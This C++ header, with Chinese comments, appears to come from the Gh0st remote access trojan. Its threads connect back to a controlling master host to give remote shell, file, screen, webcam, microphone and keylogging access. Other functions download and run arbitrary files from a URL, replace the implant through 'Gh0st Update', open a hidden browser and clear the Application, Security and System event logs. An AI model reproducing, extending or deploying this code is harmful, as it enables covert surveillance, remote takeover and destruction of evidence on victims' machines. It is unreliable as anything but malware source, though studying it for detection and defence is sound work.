#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED
#include "KernelManager.h"
#include "FileManager.h"
#include "ScreenManager.h"
#include "ShellManager.h"
#include "VideoManager.h"
#include "AudioManager.h"
#include "SystemManager.h"
#include "KeyboardManager.h"

#include "SysInfo.h"

#include "until.h"
#include <wininet.h>
#include <urlmon.h>
#pragma comment(lib,"urlmon.lib")
#include <Shellapi.h>

DWORD WINAPI Loop_SysInfoManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CSysInfo	manager(&socketClient);
	socketClient.run_event_loop();
	
	return 0;
}

//文件管理socket
DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CFileManager	manager(&socketClient);
	socketClient.run_event_loop();

	return 0;
}
//远程终端socket
DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CShellManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

//屏幕监控socket
DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CScreenManager	manager(&socketClient);

	socketClient.run_event_loop();
	return 0;
}

// 摄像头不同一线程调用sendDIB的问题
DWORD WINAPI Loop_VideoManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CVideoManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

//语音监听socket
DWORD WINAPI Loop_AudioManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CAudioManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

//系统管理socket
DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSystemManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}
DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CKeyboardManager	manager(&socketClient);	
	socketClient.run_event_loop();
	
	return 0;
}

BOOL CheckFileExist(LPCTSTR lpszPath)
{
	if ( GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND ) {
		return FALSE;
	}else{
		return TRUE;
	}
}

DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;

//	if (!http_get(lpURL, lpFileName))//http_get是获取URL地址中的文件
//	{
//		return false;
//	}
	HRESULT hr = URLDownloadToFile(NULL,lpURL, lpFileName, 0, NULL);
	if ( hr == S_OK ) {
		if ( !CheckFileExist(lpFileName) )
			return false; //文件下载成功，但是文件不存在，很可能被杀毒软件查杀
    }else if ( hr == INET_E_DOWNLOAD_FAILURE ) 
		    return false;    //URL 不正确，文件下载失败	
	else
	  return false; //文件下载失败，请检查URL是否正确


	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 
	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return true;
}

//如果用urldownloadtofile的话，程序会卡死在这个函数上
bool UpdateServer(LPCTSTR lpURL)
{
	char	*lpFileName = NULL;
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;
	if (!http_get(lpURL, lpFileName))
		return false;
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 
	return CreateProcess(lpFileName, "Gh0st Update", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}

bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (nShowCmd == SW_HIDE)
	{
		char lpApplicationName[256] = {0};
		GetWindowsDirectory(lpApplicationName, sizeof(lpApplicationName));
		lpApplicationName[3] = '\0';
		lstrcat(lpApplicationName, "Program Files\\Internet Explorer\\IEXPLORE.EXE");
		
		//进程执行的应用程序的完全路径名   
		STARTUPINFO   StartupInfo;//创建进程所需的信息结构变量   
		GetStartupInfo(&StartupInfo);   
		StartupInfo.lpReserved=NULL;   
		StartupInfo.lpDesktop=NULL;   
		StartupInfo.lpTitle=NULL;   
		StartupInfo.dwFlags=STARTF_USESHOWWINDOW;   
		StartupInfo.wShowWindow=SW_HIDE;   
		//说明进程将以隐藏的方式在后台执行
		StartupInfo.cbReserved2=0;   
		StartupInfo.lpReserved2=NULL;   
		StartupInfo.hStdInput=stdin;   
		StartupInfo.hStdOutput=stdout;   
		StartupInfo.hStdError=stderr;   
		PROCESS_INFORMATION piProcess;   
		CreateProcess(lpApplicationName,NULL,NULL,NULL,TRUE,0,NULL,NULL,&StartupInfo,&piProcess);   
		
	}
	else
	{
		ShellExecute(0, "open", lpszURL, NULL, NULL, SW_SHOWNORMAL);
	}
	return 0;
}

//清除日志
void CleanEvent()
{
	char *strEventName[] = {"Application", "Security", "System"};

	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		ClearEventLog(hHandle, NULL);
		CloseEventLog(hHandle);
	}
}
//设置备注
void SetHostID(LPCTSTR lpHostID)
{
	HKEY   hKey;
	if (RegCreateKey(HKEY_LOCAL_MACHINE, "SYSTEM\\Setup", &hKey) == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey, "Host", 0, REG_SZ, (LPBYTE)lpHostID, strlen(lpHostID) + 1);
	}
	RegCloseKey(hKey);
}

//发送消息
struct MSGBOX
{
	CHAR Title[200];
	CHAR szText[1000];
	UINT Type;
}MsgBox;

DWORD WINAPI Loop_MsgBox(LPVOID lParam)
{
	
	memcpy(&MsgBox,lParam,sizeof(MSGBOX));
	
	MessageBox(NULL,MsgBox.szText,MsgBox.Title,MsgBox.Type);
	
	return 0;
}


#endif // !defined(AFX_LOOP_H_INCLUDED)
